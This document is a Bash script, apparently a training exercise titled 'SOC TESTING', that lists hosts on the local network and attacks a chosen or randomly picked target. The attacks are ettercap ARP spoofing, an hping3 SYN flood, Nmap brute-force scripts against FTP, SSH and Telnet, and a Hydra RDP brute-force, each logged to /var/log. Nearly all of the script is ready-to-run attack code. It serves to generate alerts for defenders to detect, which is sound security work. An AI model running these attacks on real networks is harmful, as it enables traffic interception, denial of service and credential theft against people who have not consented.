#!/bin/bash 

LOG_FILE="/var/log/attack_logs.log"

function LOG_ATTACK() {                                                                              #3.1 Record each selected attack in a log file stored in /var/log.
  local attack_type=$1
  local target_ip=$2
  local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
  echo "$timestamp | Attack: $attack_type | Target: $target_ip" | tee -a "$LOG_FILE"                 #3.2 The log should include details such as the type of attack, the time it was executed, and the target IP address.
}

function check_tool() {
    echo "Checking if $1 is installed..."
    if ! command -v "$1" &> /dev/null; then
        echo "Error: $1 is not installed or not in your PATH."
        exit 1
    else
        echo "$1 is installed."
    fi
}

function ARPSPOOF() {
  LOG_ATTACK " STARTING ARP Spoof" "$attack_ip"
  echo "ARP Spoof attack selected."
  echo "Running ettercap..."
  sudo ettercap -Tq -M arp:remote /"$gateway_ip"// /"$attack_ip"// | tee -a "$LOG_FILE"
  sleep 2
  echo "ARP Spoof attack completed." | tee -a "$LOG_FILE"
}

function DDOS() {
  LOG_ATTACK "STARTING DDoS" "$attack_ip"
  echo "DDoS SYN flood attack selected."
  read -p "Enter target port: " target_port
  echo "Launching hping3 attack..."
  sudo hping3 -S --flood -p "$target_port" "$attack_ip" | tee -a "$LOG_FILE"
  sleep 2
  echo "DDoS SYN flood attack completed." | tee -a "$LOG_FILE"
}

function BRUTEFORCE() {
  LOG_ATTACK "STARTING Brute-Force" "$attack_ip" 
  output_file="/var/log//bruteforce_log__results_$(date '+%Y%m%d_%H%M%S').txt"
  protocols=("ftp" "ssh" "telnet")

  read -p "Provide path to passlist (e.g., /home/user/passlist.txt): " passlist
  if [[ ! -f "$passlist" ]]; then
    echo "Passlist not found. Exiting."
    return
  fi

  for protocol in "${protocols[@]}"; do
    echo "Running Nmap brute force on $protocol..."
    sudo nmap --script="${protocol}-brute" --script-args passdb="$passlist" -T4 "$attack_ip" -sV | tee -a "$output_file"
  done
  echo "Nmap brute-force attacks completed. Results saved to $output_file."

  read -p "Include RDP brute-force simulation with Hydra? [y/n]: " answer
  if [[ "$answer" == "y" ]]; then
    HYDRA
  fi
}

function HYDRA() {
 LOG_ATTACK "STARING Brute-Force with Hydra" "$attack_ip"
  read -p "Provide path to wordlist (e.g., /home/user/wordlist.txt): " wordlist
  if [[ ! -f "$wordlist" ]]; then
    echo "Wordlist not found. Exiting."
    return
  fi
  echo "Starting Hydra brute-force on RDP..."
  sudo hydra -t 4 -L "$wordlist" -P "$wordlist" rdp://"$attack_ip" | tee -a "$LOG_FILE"
  echo "Hydra brute-force attack completed."
}

function random_attack() {                                                                    #2.3 Allow the user to select a specific attack or choose one at random from the list.
    local choice=$(( RANDOM % 3 + 1 ))
    case $choice in
        1) ARPSPOOF; LOG_ATTACK "ARP Spoof" "$attack_ip" ;;
        2) DDOS; LOG_ATTACK "DDoS" "$attack_ip" ;;
        3) BRUTEFORCE; LOG_ATTACK "Brute-Force" "$attack_ip" ;;
    esac
}

function START() {
  clear
  echo "------ Starting at $(date) ------"
  cols=$(tput cols)
  banner=$(figlet -f slant -w $cols "SOC TESTING")
  project=$(figlet -f slant -w $cols "PROJECT: Checker")

  echo "$banner"
  echo "$project"

  echo "Running without root - attacks require permission when necessary."
  check_tool nmap
  check_tool hydra

  IPS_NETWORK=($(arp -e | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'))

  echo "IPs detected on network:"
  for i in "${!IPS_NETWORK[@]}"; do
      echo "$((i+1))) ${IPS_NETWORK[i]}"                                                                #2.1 Display all available IP addresses on the network to the user.
  done

  echo "============================================================="

  read -p "Select an IP by number (e.g., 1), or type 'random': " ip_choice                              #2.5 For each selected attack, let the user specify a target IP address or choose one randomly from the detected IP addresses.

  if [[ "$ip_choice" == "random" ]]; then
      attack_ip=${IPS_NETWORK[$RANDOM % ${#IPS_NETWORK[@]}]}
      echo "Randomly selected IP: $attack_ip"
  elif [[ "$ip_choice" =~ ^[0-9]+$ ]] && (( ip_choice > 0 && ip_choice <= ${#IPS_NETWORK[@]} )); then
      attack_ip=${IPS_NETWORK[$((ip_choice-1))]}
      echo "Selected IP: $attack_ip"
  else
      echo "Invalid input. Exiting."
      exit 1
  fi
  echo "Target IP: $attack_ip"
  echo "============================================================="                               #1.1. Implement at least three (3) different types of attacks, each as a separate function.
  echo -e "\nAttack Options:"                                                                        #1.2. Provide a clear description for each attack that will be displayed when the attack is chosen.
  echo "[1] ARPSpoof"                                                                                #2.2 Show a list of all possible attacks along with their descriptions.
  echo "[2] DDoS "
  echo "[3] Brute-Force (Nmap/Hydra)"
  echo "[4] Random attack"
  echo "============================================================="
  read -p "Choose attack [1-4]: " attack
  case $attack in
    1) ARPSPOOF; LOG_ATTACK "ARP Spoof" "$attack_ip" ;;
    2) DDOS; LOG_ATTACK "DDoS" "$attack_ip" ;;
    3) BRUTEFORCE; LOG_ATTACK "Brute-Force" "$attack_ip" ;;
    4) random_attack; LOG_ATTACK "Random attack" "$attack_ip" ;;
    *) echo "Invalid selection."; exit 1 ;;                                                          #2.4 If the user enters an invalid input, display an appropriate error message and terminate the program.
  esac
  echo "============================================================="
  echo "Attack log saved at $LOG_FILE"
}

START
